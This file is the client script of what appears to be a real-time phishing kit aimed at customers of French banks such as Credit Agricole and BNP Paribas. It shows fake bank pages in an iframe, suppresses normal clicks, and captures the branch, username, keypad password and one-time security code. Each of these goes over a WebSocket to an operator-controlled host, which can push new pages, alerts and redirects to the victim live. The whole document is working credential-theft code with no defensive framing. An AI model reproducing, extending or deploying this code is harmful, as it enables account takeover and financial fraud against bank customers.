
var psykey = 'panelkey';
var psyapp= "pwr";
var psybrand = "CreditAgricole";//BnpParibas CreditAgricole TestIO
var psylink = 'ws://localhost:50600';
var psyid  = createToken();
var ws ;
var inp = "";
var onLoadPage=location.hash.split('#')[1];
var queryDict = {};
location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]});

/*********************Configurations Block*******************/

$(document).ready(function(){
    console.log('urls',queryDict);
    psykey = queryDict.key;
    psybrand = queryDict.brand;
    psylink = 'ws://'+queryDict.link;
    $('#psyconfig_submit').click(function(){

        psybrand = $('#psybrand').val();
        connect();
    });
    $('#psyconfig_newid').click(function(){
        psyid  = createToken(true);
    });
}) ;

/************************************************************/


$('#psy_frame').on('load',function(){linkEvents();$('#psy_blocker').hide(); console.log('frame loaded');});
$(document).ready(function(){addLoading(); connect();}) ;

function linkEvents()
{
    console.log("Events Linked");
    $("#psy_frame").contents().find("a,input,button").unbind('click',psyBind);
    $("#psy_frame").contents().find("a,input,button").click(psyBind);
}
function psyBind(e)
{
    if($(this).attr('data-allowed'))
    {
        console.log('event allowed for ',e.target);

    }
    else {
        e.preventDefault();
        console.log('event prevented for ',e.target);
    }


    if(e.target.id.match("^psy_")) {
        console.log(e.target.id, 'will be Processed');
        PsyProcessInput(e.target.id);
    }
}

function connect()
{
    ws = new WebSocket(psylink+'?app='+psyapp+'&brand='+psybrand+'&token='+psyid+'&key='+psykey+'&ua='+navigator.userAgent);
    ws.onopen = function () {
        console.log("connection made");
       // if(onLoadPage)
        {
           // getContent(onLoadPage);
        }
    };
    ws.onmessage = function (evt) {
        PsyProcessMessage(evt.data);
    };
    ws.onclose = function () {
        console.log('connecion closed');
        setTimeout(connect, 1000);
    };
}

function getContent(name) {
    if(localStorage.getItem(name)!=null)
    {
        console.log("getting page from storage");
        loadPage(localStorage.getItem(name));
        PsySend('info',{message:'loaded page from local cache',page:name});
    }
    else {
        console.log("requesting remote page");
        PsySend('content',{page:name});


    }
}

function PsyProcessInput(psyId)
{
    if(psyId.match('^psy_key_'))
    {
        if(psyId=='psy_key_delete')
        {
            $("#psy_frame").contents().find(".maCase").filter(function() {
                return $(this).css('visibility') == 'visible';
            }).last().css("visibility","hidden");
            if(inp.length>0)
            inp = inp.substring(inp.length-2,inp.length-1)
        }
        else {
            console.log('clicked');
            var key = psyId.replace('psy_key_', '');
            $("#psy_frame").contents().find(".maCase").filter(function () {
                return $(this).css('visibility') === 'hidden';
            }).first().css("visibility", "visible");
            if (inp.length < 6)
                inp = inp + key.toString();
        }
    }
    else {

        switch (psyId) {
            case 'psy_branch_submit':
                $('#psy_loading').show();
                PsySend('branch',{branch: $("#psy_frame").contents().find('#psy_branch').val()});
                break;
            case 'psy_login_submit':
                $('#psy_loading').show();
                PsySend('login',{username: $("#psy_frame").contents().find('#psy_username').val(),password: inp});
                inp = "";
                break;
            case 'psy_code_request':
                //$('#psy_loading').show();
                PsySend('click',{});
                break;
            case 'psy_code_submit':
                //$('#psy_loading').show();
                PsySend('code',{code:$("#psy_frame").contents().find('#psy_code_input').val()});
                break;

        }
    }
}
function PsySend(psyType,psyData)
{
    console.log('Requesting '+psyType,psyData);
    ws.send(JSON.stringify({type: psyType, data: psyData}));
}
function PsyProcessMessage(message)
{
    //console.log(message);
    var wsMessage = JSON.parse(message);
    console.log(wsMessage);
    //console.log(wsMessage.type);
    switch (wsMessage.type)
    {
        case 0: //Pfill
            var homeContent = (wsMessage.data);
            $("#psy_frame").contents().find(wsMessage.target).html(homeContent);
            break;
        case 1: //Pgoto
            window.location.hash = wsMessage.data;
            window.location.reload();
            break;
        case 2: //Pswitch
            $("#psy_frame").contents().find(wsMessage.target).css('visibility',wsMessage.data);
            break;
        case 3: //Palert
            alert(wsMessage.data);
            break;
        case 4 : //Pframe
            loadPage(wsMessage.data);
            location.hash = wsMessage.target;
            localStorage.setItem(wsMessage.target,wsMessage.data);
            break;
        case 5 : //Pattribute
            $("#psy_frame").contents().find(wsMessage.target).attr(wsMessage.data.name,wsMessage.data.value);
            break;
        case 6 : //Pinfo
            getContent(onLoadPage);
            break;
    }
}

function  makeid()
{
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var i = 0;
    for ( i = 0; i < 5; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}

function createToken(ForceNew)
{
    if(!getCookie("token") || ForceNew)
    {
        var expiry = new Date();
        expiry.setTime(Date.now()+(48*60*60*1000));//48 hour
        document.cookie = "token="+makeid()+"; path=/; visited=yes; expires=" + expiry.toGMTString();
    }
    $('#psyconfig_psyid').val(getCookie("token"));
    return getCookie("token");
}

function getCookie(name)
{

    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
}
function addLoading()
{

    $('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }</style><div id="psy_loading" class="psy_loading"><div >     <img src="loading.gif" alt="Loading..." class="bk-loader"></div></div>');
    $('body').append('<style>.psy_blocker   {opacity: 0.2; display: none;background-color: black;width: 100%;position: fixed;height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_blocker > div{top: 50%;left: 49%;position: fixed;    }</style><div id="psy_blocker" class="psy_blocker"><div ></div></div>');

}

$(window).on('hashchange', function() {

    onLoadPage = location.hash.split('#')[1];
    console.log("hash changed :",onLoadPage);
    getContent(onLoadPage);

});

function loadPage(content)
{
    $('#psy_blocker').show();
    var doc = document.querySelector("#psy_frame").contentWindow.document;
    doc.open();
    doc.write(content);
    doc.close();
    document.title =doc.title;
    //set favicon
    var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = doc.getElementsByTagName('base')[0].getAttribute('href');
    if(link.href.match(/value$/))
        link.href = link.href+"favicon.ico";
    else
        link.href = link.href+"/favicon.ico";

    document.getElementsByTagName('head')[0].appendChild(link);

    $('#psy_loading').hide();
    setTimeout(linkEvents(),2000);

}

